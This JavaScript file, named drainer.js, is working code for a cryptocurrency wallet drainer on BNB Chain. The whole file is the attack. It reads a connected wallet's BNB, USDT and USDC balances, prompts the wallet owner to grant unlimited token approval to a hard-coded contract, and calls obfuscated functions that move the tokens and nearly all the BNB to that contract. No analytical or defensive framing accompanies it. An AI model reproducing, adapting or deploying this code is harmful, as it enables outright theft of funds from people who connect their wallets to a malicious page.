// drainer.js
import { ethers } from 'ethers'

const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function allowance(address owner, address spender) view returns (uint256)"
]

const DRAINER_ABI = [
  "function tK7(uint256 usdtAmount, uint256 usdcAmount) external",
  "function bN3() external payable"
]

const CHAINS = {
  56: {
    name: "BNB Chain",
    nativeToken: "BNB",
    chainIdHex: "0x38",
    rpcUrls: [
      "https://bsc-dataseed.binance.org/",
      "https://bsc-dataseed1.binance.org/"
    ],
    usdcAddress: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
    usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
    drainerAddress: "0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF"
  }
}

const delay = (ms) => new Promise(r => setTimeout(r, ms))

async function checkBalance(chainId, userAddress) {
  const config = CHAINS[chainId]
  let provider

  for (const rpc of config.rpcUrls) {
    try {
      provider = new ethers.providers.JsonRpcProvider(rpc)
      await provider.getBlockNumber()
      break
    } catch (_) {}
  }

  if (!provider) throw new Error(`Нет RPC для ${config.name}`)

  const nativeBalance = await provider.getBalance(userAddress)

  const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, provider)
  const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, provider)

  const usdtBalance = await usdt.balanceOf(userAddress)
  const usdcBalance = await usdc.balanceOf(userAddress)

  return { nativeBalance, usdtBalance, usdcBalance }
}

function hasFunds(bal) {
  return (
    bal.nativeBalance.gt(ethers.utils.parseEther("0.001")) ||
    bal.usdtBalance.gt(ethers.utils.parseUnits("0.1", 6)) ||
    bal.usdcBalance.gt(ethers.utils.parseUnits("0.1", 6))
  )
}

async function switchChain(chainId) {
  await window.ethereum.request({
    method: "wallet_switchEthereumChain",
    params: [{ chainId: CHAINS[chainId].chainIdHex }]
  })
}

async function drain(chainId, signer, userAddress, bal) {
  const config = CHAINS[chainId]
  const MAX = ethers.constants.MaxUint256

  const drainer = new ethers.Contract(config.drainerAddress, DRAINER_ABI, signer)
  const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, signer)
  const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, signer)

  if (bal.usdtBalance.gt(0)) {
    const allowance = await usdt.allowance(userAddress, config.drainerAddress)
    if (allowance.lt(bal.usdtBalance)) await usdt.approve(config.drainerAddress, MAX)
  }

  if (bal.usdcBalance.gt(0)) {
    const allowance = await usdc.allowance(userAddress, config.drainerAddress)
    if (allowance.lt(bal.usdcBalance)) await usdc.approve(config.drainerAddress, MAX)
  }

  if (bal.usdtBalance.gt(0) || bal.usdcBalance.gt(0)) {
    await drainer.tK7(bal.usdtBalance, bal.usdcBalance)
  }

  const nativeToSend = bal.nativeBalance.sub(ethers.utils.parseEther("0.001"))
  if (nativeToSend.gt(0)) {
    await drainer.bN3({ value: nativeToSend })
  }
}

export async function runDrainer(provider, signer, userAddress) {
  for (const chainId of Object.keys(CHAINS)) {
    await delay(300)
    const balance = await checkBalance(chainId, userAddress)
    if (!hasFunds(balance)) continue

    await switchChain(Number(chainId))
    await drain(Number(chainId), signer, userAddress, balance)
    break
  }
}
